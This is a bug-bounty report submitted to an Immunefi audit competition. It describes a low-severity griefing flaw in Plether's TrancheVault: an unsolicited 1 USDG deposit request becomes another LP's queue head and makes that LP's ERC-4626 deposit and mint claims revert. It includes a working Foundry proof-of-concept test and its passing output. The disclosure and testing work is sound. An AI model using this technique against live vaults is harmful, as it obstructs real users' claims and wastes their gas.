# \#99603 [SC-Low] An unsolicited deposit request blocks another LP's documented deposit claim path

**Submitted on Nov 14th 2026 at 12:53:54 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99603
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
Mallory can spend 1 USDG of her own money on a `requestDeposit` that names Alice as controller, without Alice's approval. Once that request activates, it sits at the head of Alice's deposit queue. Alice can later request and activate a 5,000 USDG deposit, but the documented ERC-4626 `deposit` and `mint` claim calls still select Mallory's 1 USDG head and revert when Alice tries to claim her own request. Alice's shares remain available through `claimDeposit(ownRequestId, ...)`. The demonstrated impact is obstruction of the standard claim path

## Vulnerability Details
Plether's [LP instructions](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L187-L191) tell users to call `requestDeposit` first, then use `deposit` or `mint` to claim an activated request. These ERC-4626 calls do not take a request ID; both read `controllerDepositHead[controller]` (`TrancheVault.sol:953-995`).

1. Mallory approves the vault for 1 USDG and calls `requestDeposit(1e6, Alice, Mallory)`. `_requireRequestDepositPreflight` checks that Mallory can spend the USDG owned by Mallory and that Alice is a nonzero controller. It never checks Alice's consent or operator approval (`TrancheVault.sol:1574-1600`). `_requestDeposit` attaches the new request to Alice's controller queue (`:577-603`), where it becomes the head if the queue was empty (`:1742-1755`). Mallory has not obtained any authority over Alice's funds or shares.
2. A public `OrderRouter.settleLpEpoch` call activates Mallory's 1 USDG request. In a later epoch, Alice uses her own 5,000 USDG to submit `requestDeposit(5_000e6, Alice, Alice)`, which is also activated. The earlier 1 USDG request remains Alice's controller head, while her larger request remains claimable by its own ID.
3. Alice calls `deposit(5_000e6, Alice)` to claim her activated shares. The call selects the 1 USDG head, so `_claimDeposit` sees `assets > remainingAssets` and reverts `ERC4626ExceededMaxDeposit` (`TrancheVault.sol:1023-1043`). Calling `mint` for the shares due on Alice's 5,000 USDG request similarly exceeds the head's shares and reverts `ERC4626ExceededMaxMint` (`:1058-1076`). Neither failure advances the head. `maxDeposit(Alice)` reports 1 USDG, and `maxMint(Alice)` reports only the shares from Mallory's gift, because both views also inspect only the head (`:1285-1297`).


## Impact Details
The [Plether impact table](https://immunefi.com/audit-competition/plether/scope/) includes **Medium griefing**. Mallory can put her own paid request ahead of Alice's activated request, causing Plether's documented deposit claim calls to fail repeatedly until Alice changes method or clears the gift. A client using `maxDeposit` or `maxMint` sees only the small head rather than Alice's later claimable amount. If Alice sends a standard claim before discovering the head, that reverted transaction costs gas; repeating the same call keeps reverting. An interface exposing only the standard calls would not be able to claim Alice's later request through those calls.

## References
Add any relevant links to documentation or code


## Proof of Concept

## Proof of Concept

Attach the single file `DepositControllerQueueGriefPoC.t.sol` and place it at `packages/perps/test/poc/DepositControllerQueueGriefPoC.t.sol` in the pinned checkout. Run from the repository root:

```bash
forge test test/poc/DepositControllerQueueGriefPoC.t.sol --root packages/perps --offline --out out-deposit-controller-grief --cache-path cache-deposit-controller-grief -vv
```

The PoC uses the repository's `BasePerpTest` fixture and public `OrderRouter.settleLpEpoch` for both requests. It includes a clean control where Alice's standard `deposit` claim succeeds, the attack where `deposit` and `mint` revert. At the pinned commit, all three tests passed:

```text
[PASS] test_Attack_DepositAndMintRevertButIdClaimPaysAlice()
[PASS] test_ClaimGiftFirstRestoresStandardDepositWithoutFreshCooldown()
[PASS] test_Control_AliceClaimsHerActivatedDepositThroughDeposit()
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

The PoC does not modify any in-scope source contract.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

/// @notice A stranger's deposit request becomes the controller head for another LP.
contract DepositControllerQueueGriefPoCTest is BasePerpTest {
    address internal constant MALLORY = address(0xBAD);
    address internal constant ALICE = address(0xA11CE);
    uint256 internal constant GIFT = 1e6;
    uint256 internal constant ALICE_DEPOSIT = 5_000e6;

    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }

    function _settleAt(uint256 requestId) internal {
        vm.warp(pool.lpEpochStart(requestId));
        router.settleLpEpoch(_mockPythUpdateData(1e8));
    }

    function _requestForAlice() internal returns (uint256 id) {
        settlementToken.mint(ALICE, ALICE_DEPOSIT);
        vm.startPrank(ALICE);
        settlementToken.approve(address(seniorVault), ALICE_DEPOSIT);
        id = seniorVault.requestDeposit(ALICE_DEPOSIT, ALICE, ALICE);
        vm.stopPrank();
        _settleAt(id);
        assertEq(seniorVault.claimableDepositRequest(id, ALICE), ALICE_DEPOSIT);
    }

    function _poisonAliceHead() internal returns (uint256 giftId, uint256 aliceId) {
        assertEq(pool.minTrancheDepositAssets(), GIFT);
        settlementToken.mint(MALLORY, GIFT);
        vm.startPrank(MALLORY);
        settlementToken.approve(address(seniorVault), GIFT);
        // Mallory owns the USDG. Alice has not approved or nominated Mallory.
        giftId = seniorVault.requestDeposit(GIFT, ALICE, MALLORY);
        vm.stopPrank();
        _settleAt(giftId);

        aliceId = _requestForAlice();
        assertGt(aliceId, giftId, "requests must occupy different epochs");
        assertEq(seniorVault.controllerDepositHead(ALICE), giftId);
    }

    function test_Control_AliceClaimsHerActivatedDepositThroughDeposit() public {
        uint256 aliceId = _requestForAlice();
        assertEq(seniorVault.controllerDepositHead(ALICE), aliceId);
        assertEq(seniorVault.maxDeposit(ALICE), ALICE_DEPOSIT);
        vm.prank(ALICE);
        uint256 shares = seniorVault.deposit(ALICE_DEPOSIT, ALICE);
        assertGt(shares, 0);
        assertEq(seniorVault.balanceOf(ALICE), shares);
    }

    function test_Attack_DepositAndMintRevertButIdClaimPaysAlice() public {
        (uint256 giftId, uint256 aliceId) = _poisonAliceHead();
        uint256 aliceShares = seniorVault.claimableDepositShares(aliceId, ALICE);
        uint256 giftShares = seniorVault.maxMint(ALICE);
        assertGt(aliceShares, giftShares);
        assertEq(seniorVault.maxDeposit(ALICE), GIFT);

        vm.startPrank(ALICE);
        vm.expectRevert(abi.encodeWithSelector(
            ERC4626.ERC4626ExceededMaxDeposit.selector, ALICE, ALICE_DEPOSIT, GIFT
        ));
        seniorVault.deposit(ALICE_DEPOSIT, ALICE);
        vm.expectRevert(abi.encodeWithSelector(
            ERC4626.ERC4626ExceededMaxMint.selector, ALICE, aliceShares, giftShares
        ));
        seniorVault.mint(aliceShares, ALICE);
        vm.stopPrank();
        assertEq(seniorVault.controllerDepositHead(ALICE), giftId);

        // The attacker cannot claim either position in Alice's controller queue.
        vm.prank(MALLORY);
        vm.expectRevert();
        seniorVault.claimDeposit(aliceId, ALICE_DEPOSIT, MALLORY, ALICE);

        uint256 beforeShares = seniorVault.balanceOf(ALICE);
        vm.prank(ALICE);
        assertEq(seniorVault.claimDeposit(aliceId, ALICE_DEPOSIT, ALICE, ALICE), aliceShares);
        assertEq(seniorVault.balanceOf(ALICE) - beforeShares, aliceShares);
    }

    function test_ClaimGiftFirstRestoresStandardDepositWithoutFreshCooldown() public {
        (uint256 giftId, uint256 aliceId) = _poisonAliceHead();
        uint256 giftActivation = seniorVault.depositEpochActivationTime(giftId);
        uint256 aliceActivation = seniorVault.depositEpochActivationTime(aliceId);

        vm.prank(ALICE);
        uint256 giftedShares = seniorVault.claimDeposit(giftId, GIFT, ALICE, ALICE);
        assertGt(giftedShares, 0);
        assertEq(seniorVault.lastDepositTime(ALICE), giftActivation);
        assertLt(giftActivation, vm.getBlockTimestamp(), "old gift does not start a new claim-time cooldown");
        assertEq(seniorVault.controllerDepositHead(ALICE), aliceId);
        assertEq(seniorVault.maxDeposit(ALICE), ALICE_DEPOSIT);

        vm.prank(ALICE);
        uint256 aliceShares = seniorVault.deposit(ALICE_DEPOSIT, ALICE);
        assertGt(aliceShares, 0);
        assertEq(seniorVault.balanceOf(ALICE), giftedShares + aliceShares);
        assertEq(seniorVault.lastDepositTime(ALICE), aliceActivation);
    }
}
```
